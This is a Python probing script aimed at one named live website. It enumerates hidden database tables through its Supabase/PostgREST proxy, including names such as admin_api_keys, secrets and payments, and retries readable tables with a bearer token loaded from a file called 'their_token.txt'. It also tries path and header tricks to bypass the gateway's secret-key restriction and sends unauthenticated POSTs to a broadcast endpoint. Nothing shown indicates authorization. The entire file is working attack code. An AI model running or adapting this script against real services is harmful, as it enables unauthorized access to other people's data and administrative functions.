#!/usr/bin/env python3
"""Probe set 11 (read-only):
 A) PostgREST hidden-table discovery via /api/supabase/rest/v1/<name> (GET only, no writes)
 B) gateway secret-key (OpenAPI root) classification bypass attempts
 C) /api/broadcast POST with empty/validating body (no side-effect payload)
"""
import ssl, json, time, http.cookiejar, urllib.request, urllib.error

CTX = ssl.create_default_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
BASE = "https://onlyfakeai.ru"
KEY = "<publishable-key>"
cj = http.cookiejar.CookieJar()
OPENER = urllib.request.build_opener(urllib.request.HTTPSHandler(context=CTX),
                                     urllib.request.HTTPCookieProcessor(cj))
TOK = json.load(open("their_token.txt"))["access_token"]


def req(method, url, headers=None, body=None, timeout=20):
    h = {"User-Agent": UA, "Accept": "*/*"}
    if headers:
        h.update(headers)
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with OPENER.open(r, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return 0, {}, str(e).encode()


NAMES = """profiles jobs admin_api_keys api_keys admin_keys api_key admin_users admins
payments payment_assignments payment_history credit_transactions credit_log credits credit_history
transactions subscriptions plans plan_purchases orders purchases products templates site_config
config settings app_settings global_settings users user_roles roles permissions user_permissions
admin_activity activity_log audit_log analytics analytics_events notifications broadcasts messages
telegram_users bot_users jobs_queue job_queue queue worker_servers servers workers coupons
promo_codes referrals referral_codes sessions secrets service_keys api_tokens tokens
generations generation_logs photos document_templates countries documents rate_limits
emails support_tickets tickets flagged_users bans user_bans no_watermark_jobs
watermark_jobs rembg_jobs backgrounds portraits""".split()

print("== A) table discovery (anon publishable key, GET select=* limit=1) ==")
found = []
for name in NAMES:
    st, hd, b = req("GET", f"{BASE}/api/supabase/rest/v1/{name}?select=*&limit=1",
                    {"apikey": KEY})
    if st == 200:
        found.append(name)
        body = b.decode("utf-8", "ignore")
        print(f"  [200 EXISTS] {name}: {body[:180]}")
    elif st in (401, 403) and b"PGRST" not in b and b"does not exist" not in b:
        found.append(name)
        print(f"  [{st} GRANT?] {name}: {b.decode('utf-8','ignore')[:160]}")
    elif st not in (404,):
        print(f"  [{st}] {name}: {b.decode('utf-8','ignore')[:100]}")
    time.sleep(0.12)

print("\n  readable/exists tables:", found)

print("\n== A2) same tables with authenticated user JWT ==")
for name in found:
    st, hd, b = req("GET", f"{BASE}/api/supabase/rest/v1/{name}?select=*&limit=1",
                    {"apikey": KEY, "Authorization": "Bearer " + TOK})
    print(f"  [{st}] {name}: {b.decode('utf-8','ignore')[:200]}")
    time.sleep(0.15)

print("\n== B) secret-key endpoint classification bypass ==")
variants = [
    ("root+bearer", "/rest/v1/", {"apikey": KEY, "Authorization": "Bearer " + TOK}),
    ("root+bearer-only", "/rest/v1/", {"Authorization": "Bearer " + TOK}),
    ("root%2e", "/rest/v1/%2e", {"apikey": KEY, "Authorization": "Bearer " + TOK}),
    ("root-dot", "/rest/v1/.", {"apikey": KEY, "Authorization": "Bearer " + TOK}),
    ("root+openapi-accept", "/rest/v1/", {"apikey": KEY, "Authorization": "Bearer " + TOK,
                                          "Accept": "application/openapi+json"}),
    ("root-query", "/rest/v1/?select=a", {"apikey": KEY, "Authorization": "Bearer " + TOK}),
]
for tag, p, h in variants:
    st, hd, b = req("GET", BASE + "/api/supabase" + p, h)
    txt = b.decode("utf-8", "ignore")
    print(f"  [{tag}] {st} ct={hd.get('content-type','')[:30]} len={len(b)} "
          f"openapi={'openapi' in txt or 'swagger' in txt} :: {txt[:150]}")
    time.sleep(0.4)

print("\n== C) /api/broadcast POST (validation-only bodies) ==")
for body in [b"{}", json.dumps({"message": ""}).encode()]:
    st, hd, b = req("POST", BASE + "/api/broadcast",
                    {"Content-Type": "application/json"}, body)
    print(f"  POST /api/broadcast {body[:20]} -> {st}: {b.decode('utf-8','ignore')[:200]}")
    time.sleep(0.5)
